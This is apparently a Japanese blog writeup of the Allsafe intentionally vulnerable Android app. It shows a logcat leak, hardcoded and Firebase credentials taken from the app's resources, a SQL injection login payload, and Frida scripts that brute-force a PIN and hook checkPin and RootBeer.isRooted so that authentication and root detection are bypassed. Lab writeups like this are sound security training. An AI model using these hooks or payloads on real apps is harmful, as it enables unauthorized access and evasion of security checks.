---
title: "Allsafe writeup"
date: 2023-08-31T20:48:13+09:00
tag: [Android]
draft: true
---

# Allsafe

- [Allsafe](#allsafe)
  - [Insecure Logging](#insecure-logging)
  - [Hardcode Credentials](#hardcode-credentials)
  - [Firebase Database](#firebase-database)
  - [Insecure Shared Preferences](#insecure-shared-preferences)
  - [SQL injection](#sql-injection)
- [PIN Bypass](#pin-bypass)
    - [frida を使用したブルートフォースの探索](#frida-を使用したブルートフォースの探索)
    - [password が間違っていてもあっている判定をさせる](#password-が間違っていてもあっている判定をさせる)
  - [Root Detection](#root-detection)
  - [Secure Flag Bypass](#secure-flag-bypass)

## Insecure Logging

```text
Simple information disclosure vulnerability. Use the logcat command-line tool to discover sensitive information.
```

Allsafe を起動し、`Insecure Logging`を開きます。

[hacker one](https://hackerone.com/reports/5314)を見るとわかりますが、`logcatに流れる=他のアプリケーションから読み取れる`ということなので、情報漏洩が起こりえます。

脆弱なコードを見てみるとこの部分っぽいです。

```java
public static /* synthetic */ boolean lambda$onCreateView$0(TextInputEditText secret, TextView v, int actionId, KeyEvent event) {
        if (actionId == 6) {
            Editable text = secret.getText();
            Objects.requireNonNull(text);
            if (!text.toString().equals("")) {
                Log.d("ALLSAFE", "User entered secret: " + secret.getText().toString());
                return false;
            }
            return false;
        }
        return false;
    }
```

User entered secret で grep をかけておきます。

text field に値を入れ Enter を押すと取得できていることがわかります。

```bash
$ adb logcat -D Allsafe | grep entered
08-31 21:17:02.544  7481  7481 D ALLSAFE : User entered secret: 123456789
08-31 21:48:18.510  7481  7481 D ALLSAFE : User entered secret: se0r12
```

## Hardcode Credentials

`resources/res/values/strings.xml`

```xml
<string name="dev_env">https://admin:password123@dev.infosecadventures.com</string>
```

という何やら良さそうな url がありました。

`HardcodeCredentials.java`

```xml
<UsernameToken xmlns=\"http://siebel.com/webservices\">superadmin</UsernameToken>\n                 <PasswordText xmlns=\"http://siebel.com/webservices\">supersecurepassword</PasswordText>\n
```

## Firebase Database

`string.xml`をみると、

```xml
<string name="firebase_database_url">https://allsafe-8cef0.firebaseio.com</string>
<string name="gcm_defaultSenderId">983632160629</string>
<string name="google_api_key">AIzaSyDjteCQ0-ElkfBxVZIZmBfCSPNEYUYcK1g</string>
<string name="google_app_id">1:983632160629:android:d1d9132ddd988e7127553c</string>
<string name="google_crash_reporting_api_key">AIzaSyDjteCQ0-ElkfBxVZIZmBfCSPNEYUYcK1g</string>
<string name="google_storage_bucket">allsafe-8cef0.appspot.com</string>
```

このような認証情報らしきものが見える。

firebase_databae_url に`.json`をつけてアクセスすると、

```json
{
  "flag": "5077e90341de49d0ed79b8ee53572dab",
  "secret": "A bug is never just a mistake. It represents something bigger. An error of thinking. That makes you who you are."
}
```

flag が手に入った。

## Insecure Shared Preferences

`UnsecureSharedPreferense.java`

```java
SharedPreferences sharedpreferences = requireActivity().getSharedPreferences("user", 0);
SharedPreferences.Editor editor = sharedpreferences.edit();
editor.putString("username", username.getText().toString());
editor.putString("password", password.getText().toString());
editor.apply();
SnackUtil.INSTANCE.simpleMessage(requireActivity(), "Successful registration!");
```

`username`, `password`, `password again`フィールドに値をいれ、adb で確認すると`/data/data/infosecadventures.allsafe/shared_prefs`に`user.xml`があることが確認できる。

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="password">password</string>
    <string name="username">se0r12</string>
</map>
```

## SQL injection

```java
 public final void onClick(View it) {
    String md5;
    SQLiteDatabase sQLiteDatabase = db;
    StringBuilder sb = new StringBuilder();
    sb.append("select * from user where username = '");
    sb.append(String.valueOf(username.getText()));
    sb.append("' and password = '");
    md5 = SQLInjection.this.md5(String.valueOf(password.getText()));
    sb.append(md5);
    sb.append("'");
    Cursor cursor = sQLiteDatabase.rawQuery(sb.toString(), null);
    Intrinsics.checkNotNullExpressionValue(cursor, "db.rawQuery(\"select * fr….toString()) + \"'\", null)");
    StringBuilder data = new StringBuilder();
    if (cursor.getCount() > 0) {
        cursor.moveToFirst();
        do {
            String user = cursor.getString(1);
            String pass = cursor.getString(2);
            data.append("User: " + user + " \nPass: " + pass + '\n');
        } while (cursor.moveToNext());
        cursor.close();
        Toast.makeText(SQLInjection.this.getContext(), data, 1).show();
    }
    cursor.close();
    Toast.makeText(SQLInjection.this.getContext(), data, 1).show();
}
```

password は md5 でハッシュした結果を探すようです。

```sql
select * from user where username = ' <username> ' and password = ''
```

のようなクエリなので、以下を入れてみます。

```text
adb shell input text "\'\ or\ \'a\'=\'a\'\-\-"
```

コレにより、色々な認証情報が浮かび上がります。

# PIN Bypass

```java
EditText editText2 = pin;
Intrinsics.checkNotNullExpressionValue(editText2, "pin");
checkPin = pinBypass.checkPin(editText2.getText().toString());
```

```java
public final boolean checkPin(String pin) {
    byte[] decode = Base64.decode("NDg2Mw==", 0);
    Intrinsics.checkNotNullExpressionValue(decode, "android.util.Base64.deco…roid.util.Base64.DEFAULT)");
    return Intrinsics.areEqual(pin, new String(decode, Charsets.UTF_8));
}
```

`NDg2Mw==`を base64 deocde した値と比較するというもの。

```bash
$ echo NDg2Mw== | base64 -d
4863
```

`Access granted, good job!`が見えたら勝利

### frida を使用したブルートフォースの探索

テキストフィールドを見ると、4 文字であることがわかる。

つまり、`9 * 9 * 9 * 9 = 6561`通りしか無い。

ブルートフォースでパスワードを無理やり当てることができそうだ。

```javascript
// frida -U -l script.js -f infosecadventures.allsafe

if (Java.available) {
  Java.perform(() => {
    let pinBypassClass = Java.use(
      "infosecadventures.allsafe.challenges.PinBypass"
    ).$new();
    for (let i = 0; i < 10000; i++) {
      let pin = String(i).padStart(4, 0);
      if (pinBypassClass.checkPin(pin)) {
        console.log(`found valid pin: ${i}`);
      }
    }
  });
}
```

```bash
found valid pin: 4863
```

あっているように思えます。

### password が間違っていてもあっている判定をさせる

```java
if (Java.available) {
    Java.perform(()=> {
        let pinBypassClass = Java.use("infosecadventures.allsafe.challenges.PinBypass");
        pinBypassClass.checkPin.implementation = () =>{
            return true;
        }
    });
}
```

これで適当な数字を押しても正解判定されます。

## Root Detection

root を検知してくるというものだろう。

```java
public final void onClick(View it) {
    if (new RootBeer(RootDetection.this.getContext()).isRooted()) {
        SnackUtil snackUtil = SnackUtil.INSTANCE;
        FragmentActivity requireActivity = RootDetection.this.requireActivity();
        Intrinsics.checkNotNullExpressionValue(requireActivity, "requireActivity()");
        snackUtil.simpleMessage((Activity) requireActivity, "Sorry, your device is rooted!");
        return;
    }
    SnackUtil snackUtil2 = SnackUtil.INSTANCE;
    FragmentActivity requireActivity2 = RootDetection.this.requireActivity();
    Intrinsics.checkNotNullExpressionValue(requireActivity2, "requireActivity()");
    snackUtil2.simpleMessage((Activity) requireActivity2, "Congrats, root is not detected!");
}
```

isRootedの実装を見てみると、

```java
public boolean isRooted() {
    return detectRootManagementApps() || detectPotentiallyDangerousApps() || checkForBinary(Const.BINARY_SU) || checkForDangerousProps() || checkForRWPaths() || detectTestKeys() || checkSuExists() || checkForRootNative() || checkForMagiskBinary();
}
```

こいつがfalseを返すようにしてあげれば良さそうです。

`isRooted()`は、`com.scottyab.rootbeer`packageの`RootBeer`クラス内に定義されています。

```javascript
if (Java.available) {
    Java.perform(() => {
        let rootBeerClass = Java.use("com.scottyab.rootbeer.RootBeer");
        rootBeerClass.isRooted.implementation = function() {
            return false;
        }
    });
}
```

実行してあげれば、`Congrats, root is not detected!`で回避できていることがわかるはず。


## Secure Flag Bypass

Secure Flag Bypassの画面は、スクリーンショットを禁じられている。

コレは技術的には脆弱性ではないはず。

